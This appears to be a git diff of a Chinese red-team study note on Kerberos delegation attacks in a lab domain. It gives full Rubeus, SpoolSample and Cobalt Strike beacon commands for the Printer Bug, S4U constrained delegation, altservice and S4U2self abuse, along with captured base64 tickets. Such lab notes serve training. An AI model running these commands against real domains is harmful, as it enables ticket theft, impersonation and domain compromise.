@@ -270,11 +270,13 @@ beacon> jobkill 1
 
 5. 转存ticket
 
-1660349494829.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349494829.png)
 
 6. 使用上面生成的ticket
 
-1660349572197.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349572197.png)
 
 
 # The "Printer Bug"
@@ -285,7 +287,8 @@ beacon> jobkill 1
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
 ```
-1660349812805.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349812805.png)
 
 2. 在WKSTN-1强制dc-2向srv-1进行身份验证
 
@@ -293,19 +296,23 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser
 execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
 ```
 
-1660349927216.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349927216.png)
 
 3. 捕获到DC2的ticket
 
-1660349990632.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349990632.png)
 
 4. 制作成dc2的ticket
 
-1660350175707.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350175707.png)
 
 5. 导入ticket
 
-1660350337962.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350337962.png)
 
 # Constrained Delegation
 
@@ -357,7 +364,8 @@ GitHub: @tomcarver16
 
 ```
 
-1660350554524.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350554524.png)
 
 从枚举结果可知，srv-2委派了
 
@@ -402,7 +410,8 @@ Action: Triage Kerberos Tickets (All Users)
 ```
 
 
-1660351272613.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660351272613.png)
 
 
 ## 方法二
@@ -445,24 +454,24 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$
 ```
 
 
-根据base64制作tgt
+根据base64制作tgt（这一步非必须，下面直接用了bases64做ticket）
 
 ```
-[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\srv-2.kirbi", [Convert]::FromBase64String("doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
+[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\srv-2.kirbi", [Convert]::FromBase64String("doIFLDCCBSig...SU8="))
 ```
 
 
 根据tgt，生成访问cifs的tgs
 
 ```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
 ```
 
 结果
 
 ```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
-[*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEJDCCBCBhggQcMIIEGKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9IwggPOoAMCARKhAwIBAqKCA8AEggO8fOhVlAS/zEnZTsYjnXPdDMy0KpsClN+FYLxvzJf0Q5BTvFsP7s4ydsq8Irv90yGukYz+LkKueGx6wOlWPoXt0ukG/uVmhMjJMI96W92nQd2QRVoN2Fquzo7L8PU5MT0HkglN2ZwjYlUK2IkYQ++lShBEBZFiYM8lmvUSd3F/thF3b2DBPSRQ0LOkuiU0XydekDDdkycYneAjWnNpOtE6QkfWR/GTwis/Sz35tEZufcSM9UuXdd4GPy0eIkUpPXb08s88HXsRmTK17n3d738VIGKRjwV97FuR7R56S5N5CQvyfjpUbzf0nX3AgO7522Jv+Wz9DV1ruXpthXGf6iXHVkHunKptD7DTFwdrWkOGNIogOkDjqHF7Ejc4Rs0ozsZealvM52nC2EHuwQhQ2YrfbZXV46TXs+Vh4S+pBAUvVYoEuIGDBucUmfyAXHTyoXmZf8MTUAvKdYDm7NwSAv7ZcWe7R1b63/i9njxOQWhSQdVTi/FbtUZybTvnHYotp87Mraswuw0kL1/8Df/BI6QDkKiVosakW7om8y7gtihxHfPHVqxnn/qmtfbsPXBjpUcGC/hJVcwctQXNSd3uZHry0FrJ2uZszixg9isXSDiKNjs21u6EVl448MF1yig0yzhwVFZztzmzFR5e3AJF6DYAe82sjfFrLaveqcSWGMvQK3sZ7GwYnC9Mzv9TmOMAfuaHuolDfGEFluYn0b0G/3mVxirYJYwwD0jgrqCpf6qtJ/IbIRBRceNR4tkc3myptC52ip4jfb+O+TlgQtgkxerEu3RX+DQbzrGSz58QfEr3eqCtqXspcztpKZWQ+Z6ot4ae/0MgKRLicuiQX74boET6pXoJaqLjURJnwfy4p5gNAvx9PfexchfaQcmzelqShuLiiPSakVcWh7NwNzaLWszEr57QO74wdBASwRyHFrNHKUY4RGn6dFuQwxacUCgd0XxFnaUDRblE4gtlrGJ459/XQOPOCJnY501oGKnm6tEpAB8Bne3IQU0nBmfmXh1lKLJ9OD5OkiKZyzqP1KAO9vG919XS/EgaDpvBGD7GINergqn8wsWjyeUg+lAJXtJDmMIAIKbJZ1q1J//i6H8KE1x5cixFC3oUip7tj9h/4Rc1NecP6CH2/y7qaqIi+EKVe0kvBA2DSCtQyBhMfdSAWHwDulpOMsZpj5SDouqosU5rYY3ffJ6v7dHEOZoep4OGI0AXGhU02cIiaDeTFCzvvlMHzGLRV7WLIR24GzciJoxRu3/k3GeylYgHZ2I+NpWjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDuzf+ZtnnNVrd9s1eEG3GhG87pMy3KdLrw3aRaEyYHjqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNSVi0yJKMHAwUAQOEAAKURGA8yMDIyMDgxMzAwNDg1N1qmERgPMjAyMjA4MTMxMDQ4NTdapxEYDzIwMjIwODIwMDA0ODU3WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
+[*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
 [+] host called home, sent: 588995 bytes
 [+] received output:
 
@@ -490,7 +499,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impers
 [*] Got a TGS for 'nlamb' to 'SRV-2$@DEV.CYBERBOTIC.IO'
 [*] base64(ticket.kirbi):
 
-      doIFfjCCBXqgAwIBBaEDAgEWooIEnTCCBJlhggSVMIIEkaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohMwEaADAgEBoQowCBsGU1JWLTIko4IEXjCCBFqgAwIBEqEDAgEFooIETASCBEgHGCOnWInEArG+7YvJ26rS6FGunQguMmhwBApldKvGNRh26/lRd9qc4CsSKau885i7cnVokLLt+lGLYDprkw/Jsyl1iMHdc+pgnSmYt7XV8dmg0zuNgeCGePDsC5UIqZAuUcdn3ihDRXj0wFxs0HpZjQ1P8MosTBfKkNwEjjBEGZ6lYBn6QL/jxJ18TykwDdNBfI+cwB3sTSyQLmyrximqnXKOo9YhiWkG2z91v9phfQEybJhgu1YyrvHLKKcy92nYzrMVPzG8yThoYo+BkslwYVZQZL2wtfeWJTPcdXlSdyRod3280B9dYzkPEJtzcIAAT52qB2ULaMlf4/jsZLiSujdM5xbCQT3jhbWBqHIvfryUWt/x64k8hzZUagMi61drn7XOD5no0F94tarpTMte5+aoVieWVMSU9wo+mbBx0slEnDN3783tlvO/Gt6ruyymdSqZaXiMkofmHuzhzGbLCCcWw0S95uRSmV7NIG0erPdiQhx0ZJQLnYN9w/gPFrYM0qLKPzFj2bR5yLJ5BrEfAmn3t0wCcs4q0FB3PpGUDZt+YxnO1+s/eK6y5+Quaz7YmT0ECLaI1tAtjFtVdNAk0knGBX/wrvV2dOEFVc+KtXhLDu/yBCM60+90C///3+ZSjKmIwYqAGvJwpwkkBo5suL8z08StMVJ1gC7YvTOdFy2rQe83lzb4uvw6UuvG3TdKFdPdT3a2yLcYoj1OtQqXxrqEmQBIhsvDFXhuDQGSIo2dG0TVCnHJA2ns2iBbayfAB1tKc06wE9+Xu/MD1i61QemJIoMvFwNWVDESrUSSKWXSZgN4Gc7js/xlqFKOLpxrzusncscU+wAjvq5UVF07dgRjedUUiit31J3BbU/ylhSZkGZUzTC+j759dXEUdK9AseYzjYB29UCfkVL975QzHuMcLLF0x7tdpLMVxt0+XI6Zt7Dav4Njp63//fkicWv5T81DQsksRr7UG1fUaBi2HQ9aIG8z75v7bys0+6wnIR2//I8i1QtITEOglidKU8yQFmPf6FZHMH/gGYVG5moS5mRQ79+KjXKtBm0JfiRFSfdB7PEFP+LDvA3mT4LpeqcICj5mhAb4ihioh++p1oetWtwui3ecTijX9eL/6v7AFmaCBXa8bmqrEabOOo0idx2mXJKg7qVHnlHIk6A/M+wkXiVuN6h5g42CIzoIpyycXMHJWa/PYeacunis1F0d0n1E5pWwNcblijrxWqAc/3Frh5f765/7DKBF4/kAA64d72aTcqnXtGr7w7Wwpx/ScKztiGWHTRuiMx51jxkbYsyEIHuN+QqTQZ+T8qv1x+kTchylyDpDrmHMFuIoC418w1opRa247QBCFrhgCDkjOLbp0vuLfkNnuPCCqmFzOQ/bt/bsP6vEWzFLUhWvJ0O1+Fcquu2BwkmWt6/SfQWGIrCFw9VC1JASC0ppQdS9zObDJrP67TDx7dkwo4HMMIHJoAMCAQCigcEEgb59gbswgbiggbUwgbIwga+gKzApoAMCARKhIgQgKndu2STtLSCZWSIzBez2fvFBHUB00VQy/4zIBLHzmY2hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQqhCTAHGwVubGFtYqMHAwUAQCEAAKURGA8yMDIyMDgxMzAwNTMxNFqmERgPMjAyMjA4MTMxMDQ4NTdaqBMbEURFVi5DWUJFUkJPVElDLklPqRMwEaADAgEBoQowCBsGU1JWLTIk
+      doIFfjCCB............TIk
 
 [*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
 [*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
@@ -501,45 +510,48 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impers
 [+] S4U2proxy success!
 [*] base64(ticket.kirbi) for SPN 'cifs/wkstn-2.dev.cyberbotic.io':
 
-      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
+      doIGWDCC.....Ym90aWMuaW8=
 
 
 ```
 
 
-1660352025272.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352025272.png)
 
 
-
-写票据
+根据生成的tgs写票据
 
 ```
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi" , [System.Convert]::FromBase64String( "doIGWDC....aWMuaW8="))
 ```
 
-1660352469858.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352469858.png)
 
 导入票据
 
-1660352448322.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352448322.png)
 
 # Alternate Service Name
 
-申请tgs
+altservice利用原理是tgs中的服务名不受保护，可修改
+
+申请tgs，这里本来只是委托了eventlog服务，但是我们可以修改成cifs
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:doIFLDCC.....uSU8= /nowrap
 ```
 
 根据上面生成的base64写tgs票据
 
-
 ```
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc2-cifs.kirbi" , [System.Convert]::FromBase64String( "doIGUjCCBk6gAwIBBaEDAgE....MuaW8="))
 ```
 
 
-1660354070932.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660354070932.png)
 
 
 导入dc2-cifs.kirbi，访问dc2的文件系统
@@ -549,4 +561,307 @@ make_token DEV\nlamb FakePass
 kerberos_ticket_use C:\Users\Administrator\Desktop\dc2-cifs.kirbi
 ```
 
-1660353939907.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660353939907.png)
+
+# S4U2self Abuse
+
+## 利用printerbug拿到wkstn-2的tgt
+
+1. 在srv-1开启监听
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser: WKSTN-2$ /interval:10 /nowrap
+```
+
+
+2. 在WKSTN-1强制WKSTN-2向srv-1进行身份验证
+
+```
+execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe WKSTN-2 srv-1
+```
+
+
+
+3. 捕获到WKSTN-2的ticket
+
+收到
+```
+[+] received output:
+
+[*] 8/14/2022 8:03:21 AM UTC - Found new TGT:
+
+  User                  :  WKSTN-2$@DEV.CYBERBOTIC.IO
+  StartTime             :  8/14/2022 8:03:21 AM
+  EndTime               :  8/14/2022 6:03:21 PM
+  RenewTill             :  1/1/1970 12:00:00 AM
+  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFLTCCBSmgAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9EwggPNoAMCARKhAwIBAqKCA78EggO7+zYro9081g7t0z+jHT422umcZe8wpsnYp7RO0Gbtq3V8asQ4Kzv0gDvJC4Q95l3OsrX4iiP+5FbbrFtJP36aUyC5BGIQpjW4P1OqLcz+OCQmujUbtLjIz28mlt15+7Li6WHJ+jySPUQV7qGFtH5I2Rl0cV2XONN0cFqf/pueM/pWifjWKIENoUaiOtHVQyALXk4fK7qA0HzRjY7SOI1mat/MxRZKgbl1NARfdgHpVW3zbRD6PcrsaBCju7TLd55AbrtVB4auvfLR6Y/Yx99N31MUh61yzcBgUF5xkndkiMJaQyxdecjXRWmUeDz/yBmo8lQfrgGqDOcvgMYe337XZmM5eRj2JHkUzTeJ7CXEv9OBHVgSIYr0EDMjxWv3Hx/kBs2e2XMgxsTCpoPuqqnz9SUK2vebQ9dZ/7nfMnnOAU9HRJGjWUXLhHrbp7SH84DvKSqeuZjunqGsCqUzb3cTeDZmfwfHZECn6TC98Jvqzz3TfxvLIqhbdV1UYtmJLoAGFi21ScfTybC6GpR0MsA+wsivBb/gV6rqVl8jkDZI8qnK+PobmQRY5NIwALOWkoBWmkUdbVQN8LV3rwWibwKwKnBBwk90vOp0ZSrCuS+HeY+x2NEg+gbgDqp6KbmwO9RfodrbcQD1wVjJaZ7ISxU0BJ1GCOioDiCKdEaAZ3oYHJ/MBKF/p4Mt4aY6juabpwh14sGpZYb7G